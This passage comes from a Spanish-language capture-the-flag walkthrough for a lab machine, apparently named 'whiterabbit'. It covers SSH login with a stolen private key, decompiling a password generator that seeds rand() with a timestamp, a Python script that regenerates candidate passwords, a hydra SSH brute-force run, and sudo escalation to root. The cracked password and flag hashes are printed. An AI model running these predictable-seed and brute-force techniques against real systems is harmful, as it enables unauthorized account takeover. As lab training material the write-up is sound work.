-rw-------  1 root root  505 Aug 30  2024 morpheus
-rw-r--r--  1 root root  186 Aug 30  2024 morpheus.pub
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
drwx------  2 root root   40 Aug 30  2024 .ssh
```

Vemos algo super interesante y es lo que parece la clave privada `PEM` del usuario `morpheus` por lo que parece, vamos a probarla haciendo esto:

```shell
chmod 600 morpheus
ssh -i morpheus morpheus@<IP>
```

Info:

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Sep 29 11:48:50 2025 from 10.10.14.52
morpheus@whiterabbit:~$ whoami
morpheus
morpheus@whiterabbit:~$ hostname
whiterabbit
```

Ahora si estaremos en la maquina real, por lo que leeremos la `flag` del usuario.

> user.txt

```
4ab6adcb4cc30b8b6265f1b242ad1d30
```

## Escalate user neo

Si nos vamos a la carpeta `/opt` veremos el siguiente directorio y archivo.

```
neo-password-generator/neo-password-generator
```

Vemos que esto genera una contraseña de forma aleatoria cada `x` tiempo al usuario `neo` por lo que parece, si nos llevamos el `binario` a nuestra maquina atacante abriendo un servidor de `python3`.

```shell
cd /opt/neo-password-generator/
python3 -m http.server
```

Ahora en la maquina atacante haremos esto:

```shell
wget http://<IP>:8000/neo-password-generator
```

Echo esto, si abrimos la herramienta `ghidra` e importamos el binario descargado, para que nos lo decompile y poderlo ver mejor por dentro en `C#` veremos estas `2` funciones:

> main.c

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  timeval local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
  generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

> generate\_password.c

```c
void generate_password(uint param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_34;
  char local_28 [20];
  undefined1 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  srand(param_1);
  for (local_34 = 0; local_34 < 0x14; local_34 = local_34 + 1) {
    iVar1 = rand();
    local_28[local_34] =
         "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[iVar1 % 0x3e];
  }
  local_14 = 0;
  puts(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Veremos que hay una vulnerabilidad en la cual podriamos mediante el `timestamp` obtener la contraseña exacta que se genero en ese momento, si recordamos obtuvimos informacion de cuando se ejecuto el comando de generar la contraseña en el `SQLi` teniendo este `timestamp`:

```
2024-08-30 14:40:42
```

Con esto podremos crearnos un script en `python3` el cual nos va a generar `1000` contraseñas las cuales pueden ser.

> generate.py

```python
#!/usr/bin/env python3
# generate_neo_passwords_corrected.py
from ctypes import CDLL
import datetime

libc = CDLL("libc.so.6")

def main():
    # Timestamp EXACTO con timezone UTC
    exact_time = datetime.datetime(2024, 8, 30, 14, 40, 42, 
                                  tzinfo=datetime.timezone(datetime.timedelta(0)))
    seconds = exact_time.timestamp()
    
    print(f"[*] Generando contraseñas para: {exact_time}")
    print(f"[*] Timestamp con timezone: {seconds}")
    print(f"[*] Timestamp sin timezone: {datetime.datetime(2024, 8, 30, 14, 40, 42).timestamp()}")
    
    output_file = "neo_passwords.txt"
    
    with open(output_file, 'w') as f:
        for i in range(0, 1000):
            password = ""
            microseconds = i
            # Cálculo EXACTO
            current_seed_value = int(seconds * 1000 + microseconds)
            libc.srand(current_seed_value)
            
            for j in range(0, 20):
                rand_int = libc.rand()
                password += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[rand_int % 62]
            
            f.write(password + '\n')
    
    print(f"[+] Archivo generado: {output_file}")
    print(f"[+] Total de contraseñas: 1000")
    
    # Mostrar primeras y últimas para verificar
    print("\n[*] Primeras 5 contraseñas:")
    with open(output_file, 'r') as f:
        for i, line in enumerate(f):
            if i < 5:
                seed = int(seconds * 1000 + i)
                print(f"    {i+1}. {line.strip()} (seed: {seed})")
            else:
                break

if __name__ == "__main__":
    main()
```

Ahora lo ejecutaremos de esta forma:

```shell
python3 generate.py
```

Info:

```
[*] Generando contraseñas para: 2024-08-30 14:40:42+00:00
[*] Timestamp con timezone: 1725028842.0
[*] Timestamp sin timezone: 1725043242.0
[+] Archivo generado: neo_passwords.txt
[+] Total de contraseñas: 1000

[*] Primeras 5 contraseñas:
    1. L7Qf2aFEohexxuk07tEw (seed: 1725028842000)
    2. hN6DEuEFtQ5LZX8uxw9r (seed: 1725028842001)
    3. lWL7jrjJTC54qDojrCvV (seed: 1725028842002)
    4. mnQ1II9iyvPJRhLBMVfB (seed: 1725028842003)
    5. XSfLZ30sr8sjDJbx8geU (seed: 1725028842004)
```

Echo esto nos dejara un archivo llamado `neo_passwords.txt` el cual vamos a utilizar para lanzar fuerza bruta por `SSH` con `hydra` con el usuario `neo`.

```shell
hydra -l neo -P neo_passwords.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-29 08:41:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 1000 login tries (l:1/p:1000), ~16 tries per task
[DATA] attacking ssh://10.10.11.63:22/
[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-29 08:41:47
```

Veremos que ha funcionado, por lo que vamos a conectarnos por `SSH` de esta forma:

### SSH (neo)

```shell
ssh neo@<IP>
```

Metemos como contraseña `WBSxhWgfnMiclrV4dqfj`...

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

Last login: Mon Sep 29 12:43:15 2025 from 10.10.14.52
neo@whiterabbit:~$ whoami
neo
```

Y con esto veremos que estaremos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```

Vemos que podemos ejecutar como el usuario `root`, cualquier cosa por lo que haremos lo siguiente:

```shell
sudo su
```

Info:

```
root@whiterabbit:/home/neo# whoami
root
```

Con esto ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
775bbb64b935bf5192af53eaabe26a5e
```
